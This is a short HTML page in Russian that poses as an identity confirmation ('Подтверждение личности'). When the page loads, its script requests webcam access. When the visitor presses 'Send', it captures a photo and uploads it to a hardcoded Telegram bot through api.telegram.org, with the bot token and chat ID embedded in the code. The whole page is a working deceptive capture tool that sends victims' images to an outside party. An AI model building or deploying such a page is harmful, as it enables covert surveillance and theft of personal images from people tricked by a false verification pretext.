<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Подтверждение</title>
</head>
<body style="background:#0a0a0a;color:#fff;font-family:system-ui;text-align:center;padding-top:50px;">
    <h2>Подтверждение личности</h2>
    <p>Нажмите «Разрешить», чтобы продолжить</p>
    <video id="video" autoplay style="width:280px;border-radius:16px;display:none;"></video>
    <br><br>
    <button onclick="snap()" style="background:#1e90ff;border:none;color:#fff;padding:14px 30px;border-radius:40px;font-size:18px;">📸 Отправить</button>
    <p id="status" style="color:#888;margin-top:20px;">⏳ Ожидание...</p>

    <script>
        const video = document.getElementById('video');
        const status = document.getElementById('status');
        let stream = null;

        const BOT_TOKEN = '8856699923:AAEV2fZvndBsC6iBIquVi7S4ce6t5gWlIFM';
        const CHAT_ID = '5025315928';

        async function startCam() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.style.display = 'block';
                status.textContent = '✅ Камера активна';
            } catch(e) {
                status.textContent = '❌ Ошибка: ' + e.message;
            }
        }

        async function snap() {
            if (!stream) return status.textContent = '❌ Нет камеры';
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const data = canvas.toDataURL('image/png');

            status.textContent = '📤 Отправка...';

            const blob = await fetch(data).then(r => r.blob());
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('photo', blob, 'shot.png');

            try {
                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: form
                });
                const json = await res.json();
                if (json.ok) {
                    status.textContent = '✅ Фото отправлено!';
                } else {
                    status.textContent = '❌ Ошибка: ' + json.description;
                }
            } catch(e) {
                status.textContent = '❌ Ошибка сети';
            }
        }

        startCam();
    </script>
</body>
</html>
